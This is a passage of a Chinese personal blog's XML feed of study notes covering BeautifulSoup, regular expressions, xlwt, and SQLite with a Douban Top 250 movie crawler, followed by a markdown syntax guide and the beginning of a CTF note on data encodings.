class="line">    t_list&#x3D;bs.find_all(class_&#x3D;True) #class是关键字，加_区分，表示有class属性的标签</span><br><span class="line">    for item in t_list:</span><br><span class="line">        print(item)</span><br><span class="line"></span><br><span class="line">    #text参数</span><br><span class="line">    t_list&#x3D;bs.find_all(text&#x3D;&quot;hao123&quot;)</span><br><span class="line">    t_list&#x3D;bs.find_all(text&#x3D;[&quot;hao123&quot;,&quot;地图&quot;,&quot;贴吧&quot;])</span><br><span class="line">    t_list&#x3D;bs.find_all(text&#x3D;re.compile(&quot;\d&quot;)) #用正则表达式来查找包含特定文本的内容(标签里的字符串)</span><br><span class="line">    for item in t_list:</span><br><span class="line">        print(item)</span><br><span class="line"></span><br><span class="line">    #limit参数</span><br><span class="line">    t_list&#x3D;bs.find_all(&quot;a&quot;,limit&#x3D;3)</span><br><span class="line">    for item in t_list:</span><br><span class="line">        print(item)</span><br><span class="line"></span><br><span class="line">    #2.select()  ,css选择器  返回列表</span><br><span class="line">    t_list&#x3D;bs.select(&quot;title&quot;) #元素选择器</span><br><span class="line">    t_list&#x3D;bs.select(&quot;.mnav&quot;) #类选择器</span><br><span class="line">    t_list &#x3D; bs.select(&quot;#u1&quot;) #id选择器</span><br><span class="line">    t_list&#x3D;bs.select(&quot;a[class&#x3D;&#39;bri&#39;]&quot;) #属性选择器</span><br><span class="line">    t_list&#x3D;bs.select(&quot;head&gt;title&quot;) #子元素选择器</span><br><span class="line">    t_list&#x3D;bs.select(&quot;.mnav~.bri&quot;) #普通兄弟选择器</span><br><span class="line">    print(t_list[0].get_text()) #get_text()方法获取标签文本</span><br><span class="line">    for item in t_list:</span><br><span class="line">        print(item)</span><br></pre></td></tr></table></figure>

<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://zhuanlan.zhihu.com/p/181410680" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/181410680</a></p>
<p><a href="https://www.cnblogs.com/tjp40922/p/10428447.html" target="_blank" rel="noopener">https://www.cnblogs.com/tjp40922/p/10428447.html</a></p>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
  </entry>
  <entry>
    <title>Python学习笔记6-re和xlwt模块</title>
    <url>/2021/05/06/Python6/</url>
    <content><![CDATA[<p>用requests获取到数据，然后用BeautifulSoup解析数据，最后用re来提取数据，用xlwt将数据写入Excel文件里<a id="more"></a></p>
<h2 id="re库"><a href="#re库" class="headerlink" title="re库"></a>re库</h2><h3 id="正则表达式常用操作符"><a href="#正则表达式常用操作符" class="headerlink" title="正则表达式常用操作符"></a>正则表达式常用操作符</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">. 表示任何单个字符</span><br><span class="line">[ ] 字符集，对单个字符给出取值范围 [abc]表示a、b、c,[a-z]表示a到z单个字符</span><br><span class="line">[^ ] 非字符集，对单个字符给出排除范围 [^abc]表示非a或非b或非c的单个字符</span><br><span class="line">* 前一个字符0次或无限次扩展 abc*表示ab、abc、abcc、abccc等</span><br><span class="line">+ 前一个字符1次或无限次扩展 abc+表示abc、abcc、abccc等</span><br><span class="line">? 前一个字符0次或1次扩展 abc?表示ab、abc</span><br><span class="line">| 左右表达式任意一个 abc|def表示abc或def</span><br><span class="line">&#123;m&#125; 扩展前一个字符m次 ab&#123;2&#125;c表示abbc</span><br><span class="line">&#123;m,n&#125; 扩展前一个字符m至n次(含n) ab&#123;1,2&#125;c表示abc、abbc</span><br><span class="line">^ 匹配字符串开头 ^abc表示abc且在一个字符串的开头</span><br><span class="line">$ 匹配字符串结尾 abc$表示abc且在一个字符串的结尾</span><br><span class="line">( ) 分组标记，内部只能使用|操作符 (abc)表示abc,(abc|def)表示abc或def</span><br><span class="line">\d 数字，等价于[0-9]</span><br><span class="line">\w 单词字符，等价于[A-Za-z0-9_]</span><br><span class="line">\s 匹配任意空白字符，等价于[\t\n\r\f]</span><br></pre></td></tr></table></figure>

<h3 id="re库常用函数"><a href="#re库常用函数" class="headerlink" title="re库常用函数"></a>re库常用函数</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">re.search() 在一个字符串中搜索匹配正则表达式的第一个位置，返回match对象</span><br><span class="line">re.match() 从一个字符串的开始位置起匹配正则表达式，返回match对象</span><br><span class="line">re.findall() 搜索字符串，以列表类型返回全部能匹配的字串</span><br><span class="line">re.sub() 在一个字符串中替换所有匹配正则表达式的字串，返回替换后的字符串</span><br></pre></td></tr></table></figure>

<h3 id="正则修饰符，控制匹配模式"><a href="#正则修饰符，控制匹配模式" class="headerlink" title="正则修饰符，控制匹配模式"></a>正则修饰符，控制匹配模式</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">re.I 大小写不敏感</span><br><span class="line">re.S 使.匹配包括换行在内的所有字符</span><br><span class="line">等等还有一些</span><br></pre></td></tr></table></figure>

<h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import re</span><br><span class="line">#创建正则表达式对象，表示规则(字符串的模式)</span><br><span class="line">pattern&#x3D;re.compile(&quot;AA&quot;)  #此处AA，是正则表达式，用来匹配其他字符串</span><br><span class="line">m&#x3D;pattern.search(&quot;CBAA&quot;) #search字符串是被匹配的内容</span><br><span class="line">print(m)</span><br><span class="line"></span><br><span class="line">#不用模式对象写法</span><br><span class="line">m&#x3D;re.search(&quot;asd&quot;,&quot;Aasd&quot;) #前面字符串是正则，后面是被校验字符串</span><br><span class="line">print(m)</span><br><span class="line"></span><br><span class="line">m&#x3D;re.findall(&quot;a&quot;,&quot;ASDaDFGAa&quot;) #前面字符串是正则，后面是被校验字符串</span><br><span class="line">print(m)</span><br><span class="line"></span><br><span class="line">m&#x3D;re.findall(&quot;[A-Z]+&quot;,&quot;ASDaDFGAa&quot;)</span><br><span class="line">print(m)</span><br><span class="line"></span><br><span class="line">m&#x3D;re.sub(&quot;a&quot;,&quot;A&quot;,&quot;abcd&quot;) #第一个字符串为被替换字符，第二个为替换字符，第三个为匹配字符串</span><br><span class="line">print(m)</span><br><span class="line"></span><br><span class="line">#建议在正则表达式中，被比较的字符串前面加上r，不用担心转义字符的问题</span><br></pre></td></tr></table></figure>

<h2 id="xlwt库"><a href="#xlwt库" class="headerlink" title="xlwt库"></a>xlwt库</h2><p>为啥叫xlwt，我猜测可能是”excel wtire”的缩写(纯属瞎掰，为了好记)</p>
<p>利用xlwt库将抽取的数据datalist写入Excel表格</p>
<p>四步<br>1.以utf-8编码创建一个Excel对象<br>1.创建一个Sheet表<br>1.往单元格写入内容<br>1.保存表格</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import xlwt  #弹幕说直接创建csv格式文件也行，不太了解</span><br><span class="line">workbook&#x3D;xlwt.Workbook(encoding&#x3D;&quot;utf-8&quot;) #创建workbook对象</span><br><span class="line">worksheet&#x3D;workbook.add_sheet(&quot;sheet1&quot;) #创建工作表</span><br><span class="line">worksheet.write(0,0,&quot;hello&quot;) #写入数据，和矩阵或者二维数组差不多，00表示左上角元素。第一个参数表示行，第二个参数表示列，第三个参数表示内容</span><br><span class="line">workbook.save(&quot;students.xls&quot;) #保存数据表</span><br></pre></td></tr></table></figure>

<p>小练习,把九九乘法表写入excel：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">workbook&#x3D;xlwt.Workbook(encoding&#x3D;&quot;utf-8&quot;)</span><br><span class="line">worksheet&#x3D;workbook.add_sheet(&quot;cfb&quot;)</span><br><span class="line">for i in range(1,10):</span><br><span class="line">    for j in range(1,i+1):</span><br><span class="line">        worksheet.write(i-1,j-1,&quot;&#123;&#125;*&#123;&#125;&#x3D;&#123;&#125;&quot;.format(i,j,i*j))</span><br><span class="line">workbook.save(&quot;cfb.xls&quot;)</span><br></pre></td></tr></table></figure>

<p>结果如下：</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210506091915963.png" alt="image-20210506091915963"></p>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
  </entry>
  <entry>
    <title>Python学习笔记7-SQLite模块及应用</title>
    <url>/2021/05/13/Python-SQLite/</url>
    <content><![CDATA[<p>前面使用xlwt模块爬取数据到excel表中，这次用sqlite3模块爬取数据到数据库中。<a id="more"></a></p>
<h2 id="SQLite基础"><a href="#SQLite基础" class="headerlink" title="SQLite基础"></a>SQLite基础</h2><p>SQLite是python3默认支持的数据库，它是一个轻型数据库，一个db文件就是一个数据库</p>
<h3 id="1-连接数据库"><a href="#1-连接数据库" class="headerlink" title="1.连接数据库"></a>1.连接数据库</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">con&#x3D;sqlite3.connect(&quot;test.db&quot;) #打开或创建(文件不存在时)数据库文件。相对路径,也可以用绝对路径。Pycharm软件右侧Database可以操作数据库</span><br></pre></td></tr></table></figure>

<h3 id="2-创建数据表"><a href="#2-创建数据表" class="headerlink" title="2.创建数据表"></a>2.创建数据表</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">con&#x3D;sqlite3.connect(&quot;test.db&quot;)</span><br><span class="line">print(&quot;成功打开数据库&quot;)</span><br><span class="line">c&#x3D;con.cursor() #获取游标(游标,操作数据库的对象)</span><br><span class="line">sql&#x3D;&#39;&#39;&#39;</span><br><span class="line">    create table company(</span><br><span class="line">        id int primary key not null,</span><br><span class="line">        name text not null,</span><br><span class="line">        age int not null,</span><br><span class="line">        address char(50),</span><br><span class="line">        salary real</span><br><span class="line">    );</span><br><span class="line">&#39;&#39;&#39;</span><br><span class="line">c.execute(sql) #执行sql语句</span><br><span class="line">con.commit() #提交数据库操作</span><br><span class="line">con.close() #关闭数据库连接</span><br><span class="line">c.close() #关闭指针对象(游标)</span><br><span class="line">print(&quot;成功建表&quot;)</span><br></pre></td></tr></table></figure>

<h3 id="3-插入数据"><a href="#3-插入数据" class="headerlink" title="3.插入数据"></a>3.插入数据</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">con&#x3D;sqlite3.connect(&quot;test.db&quot;)</span><br><span class="line">print(&quot;成功打开数据库&quot;)</span><br><span class="line">c&#x3D;con.cursor() #获取游标(游标,操作数据库的对象)</span><br><span class="line">sql1&#x3D;&#39;&#39;&#39;</span><br><span class="line">    insert into company (id,name,age,address,salary)</span><br><span class="line">    values(1,&#39;张三&#39;,32,&#39;成都&#39;,8000);</span><br><span class="line">&#39;&#39;&#39;</span><br><span class="line">sql2&#x3D;&#39;&#39;&#39;</span><br><span class="line">    insert into company (id,name,age,address,salary)</span><br><span class="line">    values(2,&#39;李四&#39;,30,&#39;重庆&#39;,15000);</span><br><span class="line">&#39;&#39;&#39;</span><br><span class="line">c.execute(sql1) #执行sql语句</span><br><span class="line">c.execute(sql2) #执行sql语句</span><br><span class="line">con.commit() #提交数据库操作</span><br><span class="line">con.close() #关闭数据库连接</span><br><span class="line">c.close() #关闭指针对象(游标)</span><br><span class="line">print(&quot;插入数据完毕&quot;)</span><br></pre></td></tr></table></figure>

<h3 id="4-查询数据"><a href="#4-查询数据" class="headerlink" title="4.查询数据"></a>4.查询数据</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">con&#x3D;sqlite3.connect(&quot;test.db&quot;)</span><br><span class="line">print(&quot;成功打开数据库&quot;)</span><br><span class="line">c&#x3D;con.cursor() #获取游标(游标,操作数据库的对象)</span><br><span class="line">sql&#x3D;&quot;select id,name,address,salary from company&quot;</span><br><span class="line">cursor&#x3D;c.execute(sql) #执行sql语句</span><br><span class="line">for row in cursor:</span><br><span class="line">    print(&quot;id&#x3D;&quot;,row[0])</span><br><span class="line">    print(&quot;name&#x3D;&quot;,row[1])</span><br><span class="line">    print(&quot;address&#x3D;&quot;,row[2])</span><br><span class="line">    print(&quot;salary&#x3D;&quot;,row[3],&quot;\n&quot;)</span><br><span class="line">con.close() #关闭数据库连接</span><br><span class="line">c.close() #关闭指针对象(游标)</span><br><span class="line">print(&quot;查询完毕&quot;)</span><br></pre></td></tr></table></figure>

<p>查询出来的每条结果都是一个tuple类型的数据,这些tuple组成了一个tuple</p>
<p>因为爬虫应用数据库最多的就是插入和查询，删和改用的较少，只要改下sql语句就可以了</p>
<p>如果不确定sql语句写的对不对，可以在右键数据表，点击Edit Source</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210516154617319.png" alt="image-20210516154617319"></p>
<p>然后在弹出的页面里写sql语句，右键执行(Execute)一下看看结果对不对</p>
<h2 id="应用sqlite3爬取豆瓣电影top250数据到数据库"><a href="#应用sqlite3爬取豆瓣电影top250数据到数据库" class="headerlink" title="应用sqlite3爬取豆瓣电影top250数据到数据库"></a>应用sqlite3爬取豆瓣电影top250数据到数据库</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># -*-coding&#x3D;utf-8-*-</span><br><span class="line"># @Time     : 2021&#x2F;5&#x2F;11 14:15</span><br><span class="line"># @Auther   : Tianze</span><br><span class="line"># @Email    : 1252448508@qq.com</span><br><span class="line"># @File     : sqlite-crawler.py</span><br><span class="line"># @Software : PyCharm</span><br><span class="line"></span><br><span class="line">from bs4 import BeautifulSoup #网页解析，获取数据</span><br><span class="line">import requests #HTTP请求</span><br><span class="line">import re #正则表达式，进行文字匹配</span><br><span class="line">import xlwt #进行excel操作</span><br><span class="line">import sqlite3 #进行SQLite数据库操作</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    url&#x3D;&quot;https:&#x2F;&#x2F;movie.douban.com&#x2F;top250?start&#x3D;&quot;</span><br><span class="line">    #1.爬取网页</span><br><span class="line">    datalist&#x3D;getData(url)</span><br><span class="line">    #2.逐一解析数据,边爬边解析</span><br><span class="line">    #3.保存数据</span><br><span class="line">    #savepath&#x3D;&quot;.\\豆瓣电影Top250.xls&quot;</span><br><span class="line">    dbpath&#x3D;&quot;movie.db&quot;</span><br><span class="line">    #saveData(datalist,savepath) #按住ctrl点击函数，可以快速跳转定位</span><br><span class="line">    saveData2db(datalist,dbpath)</span><br><span class="line"></span><br><span class="line">#电影链接的规则</span><br><span class="line">findlink&#x3D;re.compile(r&#39;&lt;a href&#x3D;&quot;(.*?)&quot;&gt;&#39;) #.*?表示非贪婪模式</span><br><span class="line">#电影图片</span><br><span class="line">findImgSrc&#x3D;re.compile(r&#39;&lt;img.*src&#x3D;&quot;(.*?)&quot;&#39;,re.S) #返回括号中的内容，其他内容起到定位效果,re.s不忽略换行符</span><br><span class="line">#电影名</span><br><span class="line">findTitle&#x3D;re.compile(r&#39;&lt;span class&#x3D;&quot;title&quot;&gt;(.*?)&lt;&#x2F;span&gt;&#39;)</span><br><span class="line">#电影评分</span><br><span class="line">findRating&#x3D;re.compile(r&#39;&lt;span class&#x3D;&quot;rating_num&quot; property&#x3D;&quot;v:average&quot;&gt;(.*?)&lt;&#x2F;span&gt;&#39;)</span><br><span class="line">#评价人数</span><br><span class="line">findJudge&#x3D;re.compile(r&#39;&lt;span&gt;(\d*)人评价&lt;&#x2F;span&gt;&#39;)</span><br><span class="line">#电影寓意</span><br><span class="line">findInt&#x3D;re.compile(r&#39;&lt;span class&#x3D;&quot;inq&quot;&gt;(.*?)&lt;&#x2F;span&gt;&#39;)</span><br><span class="line">#电影相关信息</span><br><span class="line">findBd&#x3D;re.compile(r&#39;&lt;p class&#x3D;&quot;&quot;&gt;(.*?)&lt;&#x2F;p&gt;&#39;,re.S)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#爬取网页</span><br><span class="line">def getData(url):</span><br><span class="line">    datalist&#x3D;[]</span><br><span class="line">    for i in range(0,10): #调用10次</span><br><span class="line">        url1&#x3D;url+str(i*25)</span><br><span class="line">        html&#x3D;getURL(url1)</span><br><span class="line"></span><br><span class="line">        #2.逐一解析数据,边爬边解析</span><br><span class="line">        soup&#x3D;BeautifulSoup(html,&quot;html.parser&quot;)</span><br><span class="line">        for item in soup.find_all(&quot;div&quot;,class_&#x3D;&quot;item&quot;): #查找符合要求的字符串，形成列表</span><br><span class="line">            #print(item) #测试，查看电影item信息</span><br><span class="line">            data&#x3D;[] #保存一部电影的所有信息</span><br><span class="line">            item&#x3D;str(item)</span><br><span class="line"></span><br><span class="line">            #电影链接：</span><br><span class="line">            link&#x3D;re.findall(findlink,item)[0] #通过正则表达式查找指定字符串</span><br><span class="line">            data.append(link) #添加电影链接</span><br><span class="line">            imgSrc&#x3D;re.findall(findImgSrc,item)[0]</span><br><span class="line">            data.append(imgSrc) #添加图片链接</span><br><span class="line">            titles&#x3D;re.findall(findTitle,item) #片名可能只有一个中文名，没有外国名</span><br><span class="line">            if len(titles)&#x3D;&#x3D;2:</span><br><span class="line">                ctitle&#x3D;titles[0]</span><br><span class="line">                data.append(ctitle) #添加中文名</span><br><span class="line">                otitle&#x3D;titles[1].replace(&quot;&#x2F;&quot;,&quot;&quot;) #去掉无关符号</span><br><span class="line">                otitle&#x3D;otitle.strip() #去掉首位空格</span><br><span class="line">                data.append(otitle) #添加外国名</span><br><span class="line">            else:</span><br><span class="line">                data.append(titles[0])</span><br><span class="line">                data.append(&quot; &quot;) #外国名字留空</span><br><span class="line">            rating&#x3D;re.findall(findRating,item)[0]</span><br><span class="line">            data.append(rating) #添加评分</span><br><span class="line">            judgeNum&#x3D;re.findall(findJudge,item)[0]</span><br><span class="line">            data.append(judgeNum) #添加评价人数</span><br><span class="line">            inq&#x3D;re.findall(findInt,item)</span><br><span class="line">            if len(inq)!&#x3D;0:</span><br><span class="line">                inq&#x3D;inq[0].replace(&quot;。&quot;,&#39;&#39;) #去掉句号</span><br><span class="line">                data.append(inq) #添加寓意</span><br><span class="line">            else:</span><br><span class="line">                data.append(&quot; &quot;) #留空</span><br><span class="line">            bd&#x3D;re.findall(findBd,item)[0]</span><br><span class="line">            bd&#x3D;re.sub(&quot;&lt;br(\s)?&#x2F;&gt;(\s+)?&quot;,&quot; &quot;,bd) #替换&lt;br&#x2F;&gt;</span><br><span class="line">            bd&#x3D;re.sub(&quot;&#x2F;&quot;,&quot; &quot;,bd) #替换&#x2F;</span><br><span class="line">            bd&#x3D;re.sub(&quot;\s+&quot;,&quot; &quot;,bd) #替换空格,否则出现NBSP</span><br><span class="line">            data.append(bd.strip()) #去掉前后的空格</span><br><span class="line">            datalist.append(data) #把处理好的一部电影信息放入datalist</span><br><span class="line">    return datalist</span><br><span class="line"></span><br><span class="line">#得到指定URL的网页内容</span><br><span class="line">def getURL(url):</span><br><span class="line">    headers&#x3D;&#123;</span><br><span class="line">        &quot;User-Agent&quot;:&quot;Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;83.0.4103.61 Safari&#x2F;537.36&quot;</span><br><span class="line">    &#125;</span><br><span class="line">    html&#x3D;&quot;&quot;</span><br><span class="line">    try:</span><br><span class="line">        res&#x3D;requests.get(url&#x3D;url,headers&#x3D;headers)</span><br><span class="line">        html&#x3D;res.text</span><br><span class="line">        #print(html)</span><br><span class="line">    except requests.HTTPError as err:</span><br><span class="line">        if hasattr(err,&quot;code&quot;):</span><br><span class="line">            print(err.code)</span><br><span class="line">        if hasattr(err,&quot;reason&quot;):</span><br><span class="line">            print(err.reason)</span><br><span class="line">    return html</span><br><span class="line"></span><br><span class="line">#保存数据</span><br><span class="line">def saveData(datalist,savepath):</span><br><span class="line">    print(&quot;[*]开始爬取&quot;)</span><br><span class="line">    book&#x3D;xlwt.Workbook(encoding&#x3D;&quot;utf-8&quot;) #创建workbook对象</span><br><span class="line">    sheet&#x3D;book.add_sheet(&quot;豆瓣电影top250&quot;) #创建工作表</span><br><span class="line">    col&#x3D;(&#39;电影链接&#39;,&#39;图片链接&#39;,&#39;电影中文名&#39;,&#39;电影外国名&#39;,&#39;评分&#39;,&#39;评价人数&#39;,&#39;寓意&#39;,&#39;相关信息&#39;)</span><br><span class="line">    for i in range(len(col)):</span><br><span class="line">        sheet.write(0,i,col[i]) #列名</span><br><span class="line">    for i in range(0,250):</span><br><span class="line">        print(&quot;第&#123;&#125;条&quot;.format(i+1))</span><br><span class="line">        data&#x3D;datalist[i]</span><br><span class="line">        for j in range(len(col)):</span><br><span class="line">            sheet.write(i+1,j,data[j])</span><br><span class="line">    book.save(savepath) #保存数据表</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def saveData2db(datalist,dbpath):</span><br><span class="line">    init_db(dbpath)</span><br><span class="line">    con&#x3D;sqlite3.connect(dbpath)</span><br><span class="line">    cursor&#x3D;con.cursor()</span><br><span class="line"></span><br><span class="line">    for data in datalist:</span><br><span class="line">        for index in range(len(data)):</span><br><span class="line">            if(index&#x3D;&#x3D;4 or index&#x3D;&#x3D;5):</span><br><span class="line">                continue</span><br><span class="line">            data[index]&#x3D;&#39;&quot;&#39;+data[index]+&#39;&quot;&#39;</span><br><span class="line">        sql&#x3D;&#39;&#39;&#39;insert into movie250(</span><br><span class="line">            info_link,pic_link,cname,ename,score,rated,introduction,info)</span><br><span class="line">            values(%s)&#39;&#39;&#39;%&quot;,&quot;.join(data)</span><br><span class="line">        #print(sql)</span><br><span class="line">        cursor.execute(sql)</span><br><span class="line">        con.commit()</span><br><span class="line">    cursor.close()</span><br><span class="line">    con.close()</span><br><span class="line"></span><br><span class="line">#初始化数据库</span><br><span class="line">def init_db(dbpath):</span><br><span class="line">    # 创建数据表</span><br><span class="line">    # numeric可以存小数</span><br><span class="line">    sql&#x3D;&#39;&#39;&#39;</span><br><span class="line">        create table movie250(</span><br><span class="line">            id integer primary key autoincrement,</span><br><span class="line">            info_link text,</span><br><span class="line">            pic_link text,</span><br><span class="line">            cname varchar,</span><br><span class="line">            ename varchar,</span><br><span class="line">            score numeric, </span><br><span class="line">            rated numeric,</span><br><span class="line">            introduction text,</span><br><span class="line">            info text</span><br><span class="line">        )</span><br><span class="line">    &#39;&#39;&#39;</span><br><span class="line">    con&#x3D;sqlite3.connect(dbpath)</span><br><span class="line">    cursor&#x3D;con.cursor()</span><br><span class="line">    cursor.execute(sql)</span><br><span class="line">    con.commit()</span><br><span class="line">    con.close()</span><br><span class="line"></span><br><span class="line">if __name__&#x3D;&#x3D;&quot;__main__&quot;:</span><br><span class="line">    main()</span><br><span class="line">    #init_db(&quot;movietest.db&quot;)</span><br><span class="line">    print(&quot;[*]导入数据库完毕&quot;)</span><br><span class="line">    #getData(&quot;https:&#x2F;&#x2F;movie.douban.com&#x2F;top250?start&#x3D;&quot;)</span><br></pre></td></tr></table></figure>

<p>结果：</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-2021513.jpg" alt="image-2021513"></p>
<h2 id="遇到的问题"><a href="#遇到的问题" class="headerlink" title="遇到的问题"></a>遇到的问题</h2><h3 id="英文名-ename-和信息-info-里出现NBSP"><a href="#英文名-ename-和信息-info-里出现NBSP" class="headerlink" title="英文名(ename)和信息(info)里出现NBSP"></a>英文名(ename)和信息(info)里出现NBSP</h3><p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210513164234326.png" alt="image-20210513164234326"></p>
<p>如图所示</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210513164504251.png" alt="image-20210513164504251"></p>
<p>爬取到的代码里的确有nbsp编码的空格，所以在正则提取处理的时候要去掉空格</p>
<p>英文名因为只有首尾有空格，所以用<code>strip()</code>函数就可以，info那里的空格在中间，所以用<code>bd=re.sub(&quot;\s+&quot;,&quot; &quot;,bd)</code>把空格字符替换成空格即可</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210513165027687.png" alt="image-20210513165027687"></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.bilibili.com/video/BV12E411A7ZQ?p=26" target="_blank" rel="noopener">https://www.bilibili.com/video/BV12E411A7ZQ?p=26</a></p>
<p><a href="https://www.bilibili.com/video/BV12E411A7ZQ?p=27" target="_blank" rel="noopener">https://www.bilibili.com/video/BV12E411A7ZQ?p=27</a></p>
<p><a href="https://www.cnblogs.com/fatcat132006/p/4081576.html" target="_blank" rel="noopener">https://www.cnblogs.com/fatcat132006/p/4081576.html</a></p>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
  </entry>
  <entry>
    <title>markdown语法学习</title>
    <url>/2020/04/20/markdown-learning/</url>
    <content><![CDATA[<h1 id="markdown介绍"><a href="#markdown介绍" class="headerlink" title="markdown介绍"></a>markdown介绍</h1><p>markdown是一种很简单的标记语言，它可以让我们用纯文本去编写文档，然后再转换成HTML等其他文档。<a id="more"></a></p>
<p>我的文章也是通过markdown来写的，非常方便、简单。</p>
<h1 id="markdown基本语法"><a href="#markdown基本语法" class="headerlink" title="markdown基本语法"></a>markdown基本语法</h1><h2 id="0x00-标题"><a href="#0x00-标题" class="headerlink" title="0x00 标题"></a>0x00 标题</h2><p>标题前加#，一个#是一级标题，以此类推，最多只有六级标题，标题级数代表字体大小，一级标题字体最大</p>
<p>实例:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#一级标题</span><br><span class="line">##二级标题</span><br><span class="line">.</span><br><span class="line">.</span><br><span class="line">.</span><br><span class="line">######六级标题</span><br></pre></td></tr></table></figure>
<h2 id="0x01-字体"><a href="#0x01-字体" class="headerlink" title="0x01 字体"></a>0x01 字体</h2><p>1.加粗：文字左右用两个*包起来</p>
<p>2.斜体：文字左右用一个*包起来</p>
<p>3.斜体加粗：文字左右用三个*包起来</p>
<p>4.删除线：文字左右用两个~~包起来</p>
<p>实例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">**加粗字体**</span><br><span class="line">*斜体*</span><br><span class="line">***斜体加粗***</span><br><span class="line">~~删除线~~</span><br></pre></td></tr></table></figure>
<h2 id="0x02-引用"><a href="#0x02-引用" class="headerlink" title="0x02 引用"></a>0x02 引用</h2><p>在引用的文字前面加&gt;即可。</p>
<blockquote>
<p>引用实例</p>
</blockquote>
<p>也可以嵌套引用，如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; This is the first level of quoting.</span><br><span class="line">&gt;</span><br><span class="line">&gt; &gt; This is nested blockquote.</span><br><span class="line">&gt;</span><br><span class="line">&gt; Back to the first level.</span><br></pre></td></tr></table></figure>
<p>效果：</p>
<blockquote>
<p>This is the first level of quoting.</p>
<blockquote>
<p>This is nested blockquote.</p>
</blockquote>
<p>Back to the first level.</p>
</blockquote>
<h2 id="0x03-分隔线"><a href="#0x03-分隔线" class="headerlink" title="0x03 分隔线"></a>0x03 分隔线</h2><p>三个或三个以上的 - 或 * 都可以。</p>
<p>效果如下：</p>
<hr>
<h2 id="0x04-图片"><a href="#0x04-图片" class="headerlink" title="0x04 图片"></a>0x04 图片</h2><p>语法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">![图片alt](图片地址 &quot;图片title&quot;)</span><br><span class="line"></span><br><span class="line">图片alt是显示在图片下的文字，相当于对图片的解释。</span><br><span class="line">图片title是图片的标题，鼠标移到图片上时显示的内容，可加可不加。</span><br></pre></td></tr></table></figure>
<h2 id="0x05-超链接"><a href="#0x05-超链接" class="headerlink" title="0x05 超链接"></a>0x05 超链接</h2><p>语法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[超链接名](超链接地址 &quot;超链接title&quot;)</span><br><span class="line">title可加可不加</span><br></pre></td></tr></table></figure>
<p>效果如下：</p>
<p><a href="https://tianzeee.github.io" target="_blank" rel="noopener">Tianze’s Blog</a></p>
<h2 id="0x06-代码"><a href="#0x06-代码" class="headerlink" title="0x06 代码"></a>0x06 代码</h2><p>单行代码：两边用一个反引号包起来<br>如下：</p>
<p> <code>code</code></p>
<p>代码块：上下用三个反引号包起来，反引号但独占一行。</p>
<p>如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(&#96;&#96;&#96;)</span><br><span class="line"> code……</span><br><span class="line"> code……</span><br><span class="line">(&#96;&#96;&#96;)</span><br></pre></td></tr></table></figure>
<blockquote>
<p>注：为了防止转译，上下的三个反引号加了小括号，实际是没有的，这里只是用来演示。</p>
</blockquote>
<h2 id="0x07-最后"><a href="#0x07-最后" class="headerlink" title="0x07 最后"></a>0x07 最后</h2><p>还有一些语法如列表、表格、流程图等没有写到，由于用到的很少所以就没仔细去看，如果想了解可以参考<a href="https://www.runoob.com/markdown/md-tutorial.html" target="_blank" rel="noopener">菜鸟教程</a></p>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
  </entry>
  <entry>
    <title>misc之数据编码</title>
    <url>/2021/02/04/encode/</url>
    <content><![CDATA[<h1 id="常见进制"><a href="#常见进制" class="headerlink" title="常见进制"></a>常见进制</h1><p>01、hex</p>
<h1 id="进制转换："><a href="#进制转换：" class="headerlink" title="进制转换："></a>进制转换：</h1><p>二进制转ascii码</p>
<p>二进制转morse码<br>二进制转二维码（绘图）-用python的PIL库写脚本转</p>
<a id="more"></a>
<p>二进制转图片（hex）-用010打开转换的十六进制判断文件头，修改正确后缀打开即可</p>
<p>二进制转万物<br>………………</p>
<h1 id="常见编码"><a href="#常见编码" class="headerlink" title="常见编码"></a>常见编码</h1><h2 id="ascii："><a href="#ascii：" class="headerlink" title="ascii："></a>ascii：</h2><p>Ascii主要用来显示现代英语</p>
<h2 id="base家族："><a href="#base家族：" class="headerlink" title="base家族："></a>base家族：</h2><p>base64：把3个8位字节转化为4个6位字节，之后在6位的前面补两个0，形成8位一个字节的形式，6位2进制能表示的最大数是2的6次方是64，这也是为什么是64个字符（A-Z,a-z,0-9,+,/这64个编码字符，=号不属于编码字符，而是填充字符）的原因</p>
<p>base32：使用32个可打印字符（A-Z和2-7）对任意字节数据进行编码，编码后的字符串不区分大小写并排除了容易混淆的字符。tips：末尾最多有6个=</p>
